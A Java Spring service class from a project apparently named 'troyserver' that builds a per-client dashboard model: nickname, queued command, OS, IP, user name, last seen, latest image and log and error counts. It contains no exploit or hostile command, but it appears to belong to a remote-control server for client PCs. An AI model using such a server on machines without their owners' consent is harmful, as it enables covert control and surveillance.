package ch.lebois.troyserver.service;

import ch.lebois.troyserver.data.entity.Client;
import ch.lebois.troyserver.data.entity.Message;
import ch.lebois.troyserver.data.repository.ClientFieldRepository;
import ch.lebois.troyserver.data.repository.ImageRepository;
import ch.lebois.troyserver.data.repository.MessageRepository;
import ch.lebois.troyserver.model.ClientModel;
import org.springframework.stereotype.Service;

/**
 * @author Felix
 * @date 16.04.2018
 * <p>
 * Project: ServerControl
 * Package: ch.lebois.troyserver.service
 **/
@Service
public class ModelService {

    private ClientFieldRepository clientFieldRepository;
    private ImageRepository imageRepository;
    private MessageRepository messageRepository;

    public ModelService(ClientFieldRepository clientFieldRepository, ImageRepository imageRepository,
                        MessageRepository messageRepository) {
        this.clientFieldRepository = clientFieldRepository;
        this.imageRepository = imageRepository;
        this.messageRepository = messageRepository;
    }

    public ClientModel getClientModel(Client client) {
        ClientModel clientModel = new ClientModel();
        clientModel.setClient(client.getPcName());
        clientModel.setNickname(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "nickname").getValue());
        clientModel.setCommand(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "command").getValue());
        clientModel.setOs(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "os").getValue());
        clientModel.setLastseen(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "lastseen").getValue());
        clientModel.setArch(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "arch").getValue());
        clientModel.setIp(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "ip").getValue());
        clientModel.setPcuser(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "pcuser").getValue());
        clientModel.setRefreshtime(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "refreshtime").getValue());
        try {
            clientModel.setImg(imageRepository.findImagesByPcNameFkOrderByNameDesc(client.getPcName()).get(0).getName());
        } catch (IndexOutOfBoundsException e) {
            clientModel.setImg("none");
        }

        for (Message m : messageRepository.findAll()) {
            if (m.getPcNameFk().equals(client.getPcName())) {
                clientModel.setLogcount(clientModel.getLogcount() + 1);
                if (m.getType().equals("errorout")) {
                    clientModel.setErrorcount(clientModel.getErrorcount() + 1);
                }
            }
        }
        return clientModel;
    }


}
